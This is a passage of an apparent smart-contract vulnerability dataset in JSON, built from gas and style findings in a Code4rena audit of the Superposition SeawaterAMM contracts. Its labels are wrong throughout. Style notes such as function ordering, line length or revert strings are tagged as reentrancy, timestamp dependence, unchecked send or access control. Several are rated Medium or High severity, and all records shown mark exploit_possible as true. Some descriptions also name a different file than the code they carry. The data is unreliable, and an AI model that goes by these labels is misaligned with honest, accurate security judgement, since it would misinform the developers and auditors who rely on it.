    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-3\"></a>[GAS-3] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (105)*: File: ./pkg/sol/OwnershipNFTs.sol 4: import \"./IERC721Metadata.sol\"; 5: import \"./ISeawaterAMM.sol\"; 7: import \"./IERC721TokenReceiver.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 202,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n276:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n299:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n317:         require(swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n339:         require(swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "<a name=\"GAS-4\"></a>[GAS-4] Use Custom Errors instead of Revert Strings to save Gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries). Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Consider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.364,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n92:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall(abi.encodeCall(\n\n263:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(abi.encodeCall(\n\n282:         (bool success, bytes memory data) = _getExecutorSwapPermit2().delegatecall(abi.encodeCall(\n\n305:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(abi.encodeCall(\n\n323:         (bool success, bytes memory data) = _getExecutorSwapPermit2().delegatecall(abi.encodeCall(\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Avoid contract existence checks by using low level calls",
    "description": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence *Instances (5)*: File: ./pkg/sol/SeawaterAMM.sol 92:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall(abi.encodeCall( 263:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(abi.encodeCall(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.546,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-7\"></a>[GAS-7] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/SeawaterAMM.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.12,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 2 | | [NC-2](#NC-2) | Array indices should be referenced via `enum`s rather than via numeric literals | 7 | | [NC-3](#NC-3) | `constant`s should be defined rather than using magic numbers | 5 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n509:         if (uint8(msg.data[2]) == 0) directDelegate(_getExecutorSwap());\n\n511:         else if (uint8(msg.data[2]) == 1) directDelegate(_getExecutorUpdatePosition());\n\n513:         else if (uint8(msg.data[2]) == 2) directDelegate(_getExecutorPosition());\n\n515:         else if (uint8(msg.data[2]) == 3) directDelegate(_getExecutorAdmin());\n\n517:         else if (uint8(msg.data[2]) == 4) directDelegate(_getExecutorSwapPermit2());\n\n519:         else if (uint8(msg.data[2]) == 5) directDelegate(_getExecutorQuote());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-4\"></a>[NC-4] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (7)*: File: ./pkg/sol/OwnershipNFTs.sol 80:         if (_to.code.length == 0) return; [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.564,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   internal getAddressSlot\n   public updateProxyAdmin\n   public updateExecutors\n   internal directDelegate\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactIn41203F1D\n   external swap2ExactInPermit236B2FDD8\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external burnPositionAE401070\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionC3AC7CAA\n   external decrPosition09293696\n   external incrPositionPermit25468326E\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n   \n   Suggested order:\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactIn41203F1D\n   external swap2ExactInPermit236B2FDD8\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external burnPositionAE401070\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionC3AC7CAA\n   external decrPosition09293696\n   external incrPositionPermit25468326E\n   public updateProxyAdmin\n   public updateExecutors\n   internal getAddressSlot\n   internal directDelegate\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 1: Current order:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 111,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n42:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n214:     function swap904369BE(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external returns (int256, int256) {\n\n219:     function quote72E2ADE7(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external {\n\n225:     function quote2CD06B86E(address /* to */, address /* from */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n262:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n304:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n322:     function swapOutPermit23273373B(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n346:     function mintPositionBC5B086D(address /* token */, int32 /* lower */, int32 /* upper */) external returns (uint256 /* id */) {\n\n351:     function burnPositionAE401070(uint256 /* id */) external {\n\n356:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n371:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n400:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n413:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n418:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n527:     function _getExecutorSwap() internal view returns (address) {\n\n530:     function _getExecutorSwapPermit2() internal view returns (address) {\n\n533:     function _getExecutorQuote() internal view returns (address) {\n\n536:     function _getExecutorPosition() internal view returns (address) {\n\n539:     function _getExecutorUpdatePosition() internal view returns (address) {\n\n542:     function _getExecutorAdmin() internal view returns (address) {\n\n545:     function _getExecutorFallback() internal view returns (address) {\n\n549:     function _setProxyAdmin(address newAdmin) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-8\"></a>[NC-8] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (37)*: File: ./pkg/sol/OwnershipNFTs.sol 54:     function ownerOf(uint256 _tokenId) public view returns (address) { 98:     function _requireAuthorised(address _from, uint256 _tokenId) internal view {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 66,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n322:     function swapOutPermit23273373B(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-10\"></a>[NC-10] Lines are too long",
    "description": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length *Instances (3)*: File: ./pkg/sol/SeawaterAMM.sol 244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) { 281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.609,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n115:     function updateExecutors(\n             ISeawaterExecutorSwap executorSwap,\n             ISeawaterExecutorSwapPermit2 executorSwapPermit2,\n             ISeawaterExecutorQuote executorQuote,\n             ISeawaterExecutorPosition executorPosition,\n             ISeawaterExecutorUpdatePosition executorUpdatePosition,\n             ISeawaterExecutorAdmin executorAdmin,\n             ISeawaterExecutorFallback executorFallback\n         ) public onlyProxyAdmin {\n             _setProxies(executorSwap, executorSwapPermit2, executorQuote, executorPosition, executorUpdatePosition, executorAdmin, executorFallback);\n\n115:     function updateExecutors(\n             ISeawaterExecutorSwap executorSwap,\n             ISeawaterExecutorSwapPermit2 executorSwapPermit2,\n             ISeawaterExecutorQuote executorQuote,\n             ISeawaterExecutorPosition executorPosition,\n             ISeawaterExecutorUpdatePosition executorUpdatePosition,\n             ISeawaterExecutorAdmin executorAdmin,\n             ISeawaterExecutorFallback executorFallback\n         ) public onlyProxyAdmin {\n             _setProxies(executorSwap, executorSwapPermit2, executorQuote, executorPosition, executorUpdatePosition, executorAdmin, executorFallback);\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n455:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n455:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "<a name=\"NC-11\"></a>[NC-11] Missing Event for critical parameters change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes. *Instances (13)*: File: ./pkg/sol/OwnershipNFTs.sol 166:     function setApprovalForAll(address _operator, bool _approved) external { isApprovedForAll[msg.sender][_operator] = _approved;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 64,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n108:     /// @notice updates the addresses of the executors. only usable by the proxy admin\n         /// @param executorSwap the address of the swap executor\n         /// @param executorSwapPermit2 the deployed code for the swap_permit2 executor\n         /// @param executorQuote the deployed code for the quote executor\n         /// @param executorPosition the address of the position executor\n         /// @param executorAdmin the address of the admin executor\n         /// @param executorFallback the address of the fallback executor\n         function updateExecutors(\n             ISeawaterExecutorSwap executorSwap,\n             ISeawaterExecutorSwapPermit2 executorSwapPermit2,\n             ISeawaterExecutorQuote executorQuote,\n             ISeawaterExecutorPosition executorPosition,\n             ISeawaterExecutorUpdatePosition executorUpdatePosition,\n             ISeawaterExecutorAdmin executorAdmin,\n             ISeawaterExecutorFallback executorFallback\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-13\"></a>[NC-13] Incomplete NatSpec: `@param` is missing on actually documented functions",
    "description": "The following functions are missing `@param` NatSpec comments. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 108:     /// @notice updates the addresses of the executors. only usable by the proxy admin /// @param executorSwap the address of the swap executor",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n149:                 revert(0, returndatasize())\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"NC-17\"></a>[NC-17] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 149:                 revert(0, returndatasize()) [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/SeawaterAMM.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   StructDefinition.AddressSlot\n   FunctionDefinition.getAddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.updateExecutors\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swap2ExactInPermit236B2FDD8\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.burnPositionAE401070\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionC3AC7CAA\n   FunctionDefinition.decrPosition09293696\n   FunctionDefinition.incrPositionPermit25468326E\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n   \n   Suggested order:\n   StructDefinition.AddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.getAddressSlot\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.updateExecutors\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swap2ExactInPermit236B2FDD8\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.burnPositionAE401070\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionC3AC7CAA\n   FunctionDefinition.decrPosition09293696\n   FunctionDefinition.incrPositionPermit25468326E\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-18\"></a>[NC-18] Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 1) Type declarations 2) State variables 3) Events 4) Modifiers",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 119,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n42:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n132:     function directDelegate(address to) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-19\"></a>[NC-19] Internal and private variables and functions names should begin with an underscore",
    "description": "According to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables) *Instances (2)*: File: ./pkg/sol/SeawaterAMM.sol 42:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) { 132:     function directDelegate(address to) internal {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.194,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
